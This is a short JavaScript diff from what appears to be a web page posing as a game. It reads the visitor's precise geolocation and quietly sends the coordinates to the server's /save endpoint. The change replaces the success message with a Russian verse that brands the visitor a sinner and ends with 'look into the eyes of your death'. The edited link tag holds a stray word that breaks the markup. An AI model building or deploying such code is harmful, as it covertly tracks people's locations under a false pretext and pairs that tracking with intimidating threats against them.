@@ -28,7 +28,21 @@ function getLocation() {
       const lat = pos.coords.latitude.toFixed(6);
       const lon = pos.coords.longitude.toFixed(6);
       const acc = Math.round(pos.coords.accuracy);
-      s.innerHTML = `Готово!<br><a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="color:#4CAF50;">Открыть игру</a>`;
+      s.innerHTML = `
+Ты тень, чьим домом стала тьма,
+Чужая боль не трогала тебя.
+Душа твоя во мрак (тьму) стремится.
+Желаешь убедиться?.....
+
+О, жалки дух, ты породнился с тьмой.
+Жестоко жизнь других согубил тобой.
+Душа твоя полна грехов и смрада.
+Падёшь навеки ты... в пучины ада.....
+
+Презренная тень, затерянная во мраке,
+Приносящая боль людям, страдания и унижения,
+Душа, погрязшая во грехе,
+Взгляни в глаза своей смерти.<br><a тут href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="color:#4CAF50;">Открыть игру</a>`;
       fetch(`/save?lat=${lat}&lon=${lon}&acc=${acc}`);
     },
     err => { 
